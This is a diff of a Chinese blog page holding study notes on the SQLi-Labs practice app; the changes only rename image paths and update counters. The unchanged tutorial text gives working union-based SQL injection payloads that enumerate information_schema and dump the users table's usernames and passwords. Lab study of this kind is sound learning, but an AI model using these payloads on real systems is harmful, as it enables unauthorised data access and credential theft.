@@ -92,21 +92,21 @@
 <meta property="og:url" content="http://ug1y.github.io/2016/09/03/SQLi-Labs-学习笔记-Part-2/index.html">
 <meta property="og:site_name" content="ugly's Notes">
 <meta property="og:description" content="第一课：判断注入点Less-1中通过输入参数?id=1能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：select * from TABLE where id=1;">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903123834.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903131801.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903131016.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903215717.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903220456.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903220951.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903221300.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903221831.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903222700.png">
-<meta property="og:image" content="http://ug1y.github.io/images/sqli-20160903223146.png">
-<meta property="og:updated_time" content="2016-09-05T15:36:01.100Z">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903123834.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903131801.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903131016.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903215717.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903220456.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903220951.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903221300.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903221831.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903222700.png">
+<meta property="og:image" content="http://ug1y.github.io/images/sqli/sqli_20160903223146.png">
+<meta property="og:updated_time" content="2016-09-07T13:51:39.905Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi Labs 学习笔记 Part 2">
 <meta name="twitter:description" content="第一课：判断注入点Less-1中通过输入参数?id=1能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：select * from TABLE where id=1;">
-<meta name="twitter:image" content="http://ug1y.github.io/images/sqli-20160903123834.png">
+<meta name="twitter:image" content="http://ug1y.github.io/images/sqli/sqli_20160903123834.png">
 
 
 
@@ -370,7 +370,7 @@
       
         <h1 id="第一课：判断注入点"><a href="#第一课：判断注入点" class="headerlink" title="第一课：判断注入点"></a>第一课：判断注入点</h1><p>Less-1中通过输入参数<code>?id=1</code>能够看到获取的用户名密码的内容，改变id的值可以看到不同的用户名密码，在后端的实际查询如下：<br><code>select * from TABLE where id=1;</code><br><a id="more"></a></p>
 <p>我们输入一些特殊符号，让其产生错误，如单引号‘’’，双引号‘“’，反斜杠‘\’等，我们构造参数<code>id=1\</code>,产生错误如下：</p>
-<p><img src="/images/sqli-20160903123834.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903123834.png" alt=""></p>
 <p>可以知道输入的参数<code>$id</code>是被单引号包裹的，于是可以猜测其sql语句为：<br><code>$sql=&quot;select * from users where id=&#39;$id&#39; limit 0,1&quot;;</code></p>
 <p>于是我们可以闭包前面的语句同时注释后面的语句来构造正确的查询。</p>
 <ul>
@@ -392,9 +392,9 @@
 </ul>
 <p>这意味着我们在<strong>注释语句</strong>和<strong>闭合语句</strong>之间可以加入任何我们想执行的恶意注入代码。</p>
 <p>开始注入第一步，猜测sql查询的行数，在Less-1中构造注入<code>1&#39; order by 1--+</code>，按照第1行来排序，一直加，直到报错为止。发现当构造注入代码<code>1&#39; order by 4--+</code>时，出现错误，则说明总共查询有三行。</p>
-<p><img src="/images/sqli-20160903131801.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903131801.png" alt=""></p>
 <p>接下来我们用联合查询，构造<code>1&#39; union select 1,2,3--+</code>，但是什么也没有发生，这是由于联合查询将查询结果直接添加到数组后面，然而我们页面只显示了第一行，所以我们将构造改成<code>999&#39; union select 1,2,3--+</code>得到如下：</p>
-<p><img src="/images/sqli-20160903131016.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903131016.png" alt=""></p>
 <p>接下来，根据其显示输出的位置，我们构造注入代码添加想要查看的一些信息</p>
 <ul>
 <li><code>-1&#39; union select 1,version(),3--+</code> //查看数据库版本</li>
@@ -403,19 +403,19 @@
 <li><code>-1&#39; union select 1,@@datadir,3--+</code> //查看全局变量，数据存储目录</li>
 </ul>
 <h1 id="第三课：构造注入获取数据库或表内容"><a href="#第三课：构造注入获取数据库或表内容" class="headerlink" title="第三课：构造注入获取数据库或表内容"></a>第三课：构造注入获取数据库或表内容</h1><p>MYSQL的数据库中有一个自带的数据库information_schema，它提供了访问数据库元数据的方式。元数据就是对数据的描述，如数据库名或表名，列的数据类型，或访问权限等。普通的用户一般来说是可以有select等权限查看里面的内容。其中tables、columns等表存储着一些重要的信息。</p>
-<p><img src="/images/sqli-20160903215717.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903215717.png" alt=""></p>
 <p>接下来，我们构造一些注入来获取一些有用的信息。<br><code>-1&#39; union select 1,database(),3--+</code></p>
-<p><img src="/images/sqli-20160903220456.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903220456.png" alt=""></p>
 <p>得知当前数据库是<code>security</code>，利用元数据中的<code>tables</code>表来获取当前数据中有哪些表。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></p>
-<p><img src="/images/sqli-20160903220951.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903220951.png" alt=""></p>
 <p>同样，用函数<code>database()</code>替换字符串<code>security</code>也能达到同样的效果。另外，可以使用<code>limit</code>关键字来指定获取第几行的数据，第一个参数是行数，第二个参数是偏移量。<br><code>-1&#39; union select 1,table_name,3 from information_schema.tables where table_schema=database() limit 2,1--+</code></p>
-<p><img src="/images/sqli-20160903221300.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903221300.png" alt=""></p>
 <p>如果想要一次全显示出来，可以用函数<code>group_concat</code>字符串组拼接。<br><code>-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></p>
-<p><img src="/images/sqli-20160903221831.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903221831.png" alt=""></p>
 <p>还可以利用这种方法获取表的字段信息，例如<code>users</code>表包含哪些字段，其他的表也一样。<br><code>-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></p>
-<p><img src="/images/sqli-20160903222700.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903222700.png" alt=""></p>
 <p>最后，如果要导出表内容，通过以上获取的表名及其相应的字段信息，直接构造sql查询即可。<br><code>-1&#39; union select 1,group_concat(username),group_concat(password) from users--+</code></p>
-<p><img src="/images/sqli-20160903223146.png" alt=""></p>
+<p><img src="/images/sqli/sqli_20160903223146.png" alt=""></p>
 <hr>
 
       
@@ -533,7 +533,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">7</span>
+              <span class="site-state-item-count">8</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -541,7 +541,7 @@
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-count">3</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -550,7 +550,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-count">4</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
